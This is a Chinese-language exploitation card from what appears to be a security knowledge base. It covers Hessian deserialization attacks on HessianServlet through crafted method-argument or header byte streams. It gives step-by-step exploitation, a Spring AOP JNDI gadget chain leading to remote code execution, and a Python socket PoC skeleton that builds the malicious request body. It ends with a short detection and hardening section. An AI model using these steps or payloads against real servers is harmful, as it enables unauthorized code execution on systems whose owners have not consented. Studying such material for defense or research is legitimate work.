---
id: web-java-deser-hessian-hessianservlet-argument-header-entry
title: HessianServlet 实战入口：手搓 Hessian 调用在方法参数/Header 处触发 readObject
type: scenario
domain: web
path: web/java/deserialization/hessian
technique: hessian-servlet-argument-header-readobject-entry
aliases:
- HessianServlet 利用
- HessianSkeleton invoke
- Hessian 方法参数反序列化
- writeHeader readHeader
- 手搓 Hessian 协议
- hessian home skeleton
- x-application/hessian
- HessianServlet homeAPI
tags:
- java
- hessian
- deserialization
- servlet
- gadget
- jndi
- protocol
- rce
affected_versions: Hessian 4.0.60（原文环境版本）
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V277
  verified_at: '2026-11-07T23:55:52+08:00'
  notes: 已对照原文与10张图：HessianServlet.service→invoke→HessianSkeleton.invoke 的 c 02 00/HessianInput 分支、readHeader→readObject、readObject(args[i])、_methodMap 重载名、writeHeader 的 0x48+len 结构均与截图一致；手搓字节 c 02 00 + m/H 与原文脚本一致。原文仅验证到 nc -lv 1389 收到 JNDI 回连，未展示目标出网后的完整 RCE，卡内已写明依赖 gadget 与出网要求；未本机执行。Hessian 4.0.60 为原文环境版本，保留。dedup 无同链重复（top related 为 proxyfactory/spring-proxy/xxl-job 等不同入口）。
---

## 一句话结论

当应用用 `HessianServlet.setHomeAPI()/setHome()` 注册 home 服务（或手动调用 `hessianServlet.service()`）时，POST 到 servlet 的 Hessian 请求会进入 `HessianServlet.invoke → HessianSkeleton.invoke`：方法参数通过 `in.readObject(args[i])` 反序列化，Header 值通过 `readHeader() → readObject()` 反序列化，两者都落到 `MapDeserializer` 的 `map.put` gadget 入口；攻击者无需官方客户端，手搓 `c 02 00 + m ...`（参数）或 `c 02 00 + H ...`（Header）字节流，配合 Spring AOP JNDI 链即可在方法调用前触发 RCE。

## 原理

- **HessianServlet.service**：只接受 POST；取 `pathInfo` 作为 serviceId、`id`/`ejbid` 参数作为 objectId，调用 `ServiceContext.begin` 后进入 `this.invoke(is, os, objectId, serializerFactory)`；非 POST 返回 500 “Hessian Requires POST”，响应 `Content-Type: x-application/hessian`。
- **HessianServlet.invoke**：`objectId != null` 走 `_objectSkeleton.invoke`，否则走 `_homeSkeleton.invoke`；用 `setHomeAPI(IUserService.class)` + `setHome(new UserServiceImpl())` 注册时，home skeleton 绑定该接口与实现。
- **HessianSkeleton.invoke**：按首字节选择协议分支。`c 02 00` 命中 `CALL_1_REPLY_2` 一类分支：输入用 `HessianInput`（Hessian 1）、输出用 `Hessian2Output`。随后 `in.skipOptionalCall()`，`while ((header = in.readHeader()) != null) { Object value = in.readObject(); context.addHeader(header, value); }`——Header 值直接反序列化。
- **方法参数 sink**：读完 Header 后读取方法名 `m`，用 `getMethod(mangledName)` 查找方法；方法名支持重载混淆形式（如 `getUserById_Object`、`getUserById_1`，也支持直接 `getUserById`）。然后 `values[i] = in.readObject(args[i])` 逐个反序列化参数，最后才 `method.invoke(service, values)`。因此**反序列化发生在业务方法执行之前**，只要找到任意一个参数类型可承载 gadget 对象图的方法（如 `Object` 参数）即可。
- **Header sink**：`HessianInput` 支持 `writeHeader/readHeader`（opcode `H`，0x48，后跟两字节长度和名称），值用 `readObject` 解析；`Hessian2Input` 不支持 Header 的写/读。由于 `c 02 00` 分支的输入是 `HessianInput`，Header 变体可用。
- **协议字节**：
  - 无 Header 的参数变体：`c 02 00`（0x63 0x02 0x00）+ `m`（0x6d）+ 两字节方法名长度 + 方法名 + Hessian 序列化的参数对象图；
  - Header 变体：`c 02 00` + `H`（0x48）+ 两字节 Header 名长度 + 名称 + Hessian 序列化的对象图（值），对象图在 `readHeader` 后的 `readObject` 中触发。
- **gadget 入口**：Hessian 把对象/Map 按 Map 编码，反序列化时 `MapDeserializer.readMap` 执行 `map.put(in.readObject(), in.readObject())`；`HashMap.put` 触发 key 的 `hashCode/equals`。本场景使用 Spring AOP 链：`HotSwappableTargetSource.equals` → `PartiallyComparableAdvisorHolder.toString` → `AspectJPointcutAdvisor.getOrder` → `AspectJAroundAdvice.getOrder` → `BeanFactoryAspectInstanceFactory.getOrder` → `SimpleJndiBeanFactory.getType` → `JndiTemplate.lookup`，最终发起 JNDI（详见关联卡）。
- **为什么需要手搓**：官方 `HessianProxyFactory` 客户端默认不方便写 Header，且方法参数名会被重载混淆（`_Object`）；直接按协议拼字节可以自由选择方法参数 sink 或 Header sink，并用任意对象图作为参数/Header 值。

## 触发条件

- 目标暴露 `HessianServlet`（`setHomeAPI`/`setHome` 注册，或以其他方式调用 `hessianServlet.service`），且允许 POST、无鉴权/网络限制。
- classpath 含 `com.caucho:hessian`（原文环境 Hessian 4.0.60、Spring Boot 2.7.6、Java 8u66），反序列化未启用类白名单。
- 存在可调用的 home 方法，其参数类型能承载 gadget 对象（如 `Object` 或 Map/接口类型）；方法名可通过抓包或枚举获得。
- classpath 存在可用 gadget 链（如 spring-aop/spring-context 的 `SimpleJndiBeanFactory`），且目标可出网访问攻击者的 LDAP/RMI 服务。
- Header 变体还要求协议分支使用 `HessianInput`（`c` 调用、Hessian 1 输入）；`Hessian2Input` 不支持 Header。

## 利用步骤

1. 确认入口：向 `/hessian`（或实际 servlet 映射）POST，`Content-Type: x-application/hessian`；非 POST 返回 “Hessian Requires POST”，确认 servlet 存在。
2. 获取一个合法 home 方法及参数类型：用 `HessianProxyFactory`（`setOverloadEnabled(true)`、`setAllowNonSerializable(true)`）调用并抓包，观察方法名（如 `getUserById` 或 `getUserById_Object`）与参数编码；也可从接口/源码枚举。
3. 构造 gadget 对象图：按目标依赖选择链；本场景用 Spring AOP JNDI 链（构造方法见 [[web-java-deser-hessian-jndi-outbound-chains]]），把 `SimpleJndiBeanFactory` 的 JNDI URL 指向攻击者 LDAP/RMI。
4. 序列化对象图：可用 Hessian 客户端生成，也可按 Hessian 1 对象/M 编码手工拼接；对象图作为方法参数或 Header 值。
5. 拼接请求体：
   - 参数变体：`b'c\x02\x00m' + len(method).to_bytes(2,'big') + method + gadget_bytes`；
   - Header 变体：`b'c\x02\x00H' + len(name).to_bytes(2,'big') + name + gadget_bytes`。
6. 通过 socket 发送 POST（`Content-Length` 精确），触发 `readObject` → `map.put` → Spring AOP → JNDI lookup；用 DNSLog/nc 监听确认回连，再用 LDAP/RMI 返回可执行 gadget。
7. 若无回显：Hessian source 是 `map.put`，URLDNS 不能用于探测（缺少可控的 `hashCode` 链）；可改用异常/类加载差异做依赖探测，再选择对应链。

## PoC

请求骨架（参数变体）：

```python
import socket

method = b'getUserById'
gadget = bytes.fromhex('<Hessian 序列化的 HashMap/Spring AOP 对象图>')
body = b'c\x02\x00m' + len(method).to_bytes(2, 'big') + method + gadget

req = (b'POST /hessian HTTP/1.1\r\n'
       b'Content-Type: x-application/hessian\r\n'
       b'Host: target:8080\r\n'
       b'Connection: keep-alive\r\n'
       + f'Content-Length: {len(body)}\r\n\r\n'.encode()
       + body)
with socket.create_connection(('target', 8080)) as s:
    s.sendall(req)
    print(s.recv(4096))
```

Header 变体（HessianInput 支持，Hessian2Input 不支持）：

```python
header = b'ExampleHeader'
body = b'c\x02\x00H' + len(header).to_bytes(2, 'big') + header + gadget
```

```text
# 字节结构
# 参数: 63 02 00 6d <len2> <method> <gadget>
# Header: 63 02 00 48 <len2> <header> <gadget>
```

Spring AOP gadget 对象图的构造代码较长，按关联卡构造：

```java
// 关键对象：HotSwappableTargetSource(PartiallyComparableAdvisorHolder) 作为 HashMap key
// 其中 PartiallyComparableAdvisorHolder -> AspectJPointcutAdvisor -> AspectJAroundAdvice
//      -> BeanFactoryAspectInstanceFactory -> SimpleJndiBeanFactory(JNDI URL)
```

说明：以上仅为协议与结构骨架；完整对象图需按目标依赖生成，未在本机执行。

## 变体与关联

- 入口变体：`HessianServlet` 直接 `service()`、Spring Boot `ServletRegistrationBean`、其他把 `HessianSkeleton` 包进 Servlet/HTTP 框架的实现；`serviceId`/`objectId` 路由可决定走 home 还是 object skeleton。
- 协议变体：`c`（HessianInput + Hessian2Output）与 `C`/`H` 分支、Hessian 1 与 Hessian 2 的对象编码差异；Header 仅 HessianInput 支持。
- 方法名变体：`getUserById`、`getUserById_Object`、`getUserById_1` 等重载混淆形式通常都能解析；参数类型不限于 `Object`，只要方法存在且能承载对象图。
- sink 变体：除 Header/方法参数 readObject 外，Hessian 入口还可能直接 `readObject`（见 [[web-java-deser-hessian-deserialization-entry-map-put]]）；gadget 可换 JDK-only、Groovy、Rome、Resin、XBean 等（见 [[web-java-deser-hessian-jndi-outbound-chains]]）。
- 关联卡片：[[web-java-deser-hessian-deserialization-entry-map-put]]（MapDeserializer map.put 入口与 Hessian1/2 编码）、[[web-java-deser-hessian-jndi-outbound-chains]]（Spring AOP JNDI gadget 构造）、[[web-java-deser-hessian-spring-proxy-invocationhandler-jndi]]、[[web-java-deser-hessian-utf8-overlong-encoding-bypass]]（类名黑名单绕过）。
- 边界：方法不存在或参数类型不兼容时 `readObject` 不会执行；无 spring-context/spring-aop 或目标不出网时 Spring 链失败；`Hessian2Input` 分支不支持 Header；目标启用 SerializerFactory 允许列表时 gadget 类名会被拦截。

## 检测与防御

- 检测：POST 请求 `Content-Type: x-application/hessian` 且 body 以 `c 02 00`/`C`/`H` 开头；body 出现 `PartiallyComparableAdvisorHolder`、`HotSwappableTargetSource`、`SimpleJndiBeanFactory`、`JdbcRowSetImpl` 等类名；服务端在方法调用前出现 `Class.forName`/反序列化异常；Java 进程向 LDAP/RMI 1389/1099 等端口发起出站连接。
- 修复：不对外暴露 HessianServlet；必须使用时加认证/来源限制，只允许业务方法白名单；使用自定义 `SerializerFactory` 的类允许列表（不要只用黑名单，UTF-8 overlong 可绕过）；关闭 `setAllowNonSerializable(true)`。
- 加固：Java 侧限制 JNDI 远程类加载与出站 LDAP/RMI；升级 Hessian；监控反序列化异常与异常类名加载；禁止匿名访问 `/hessian`。
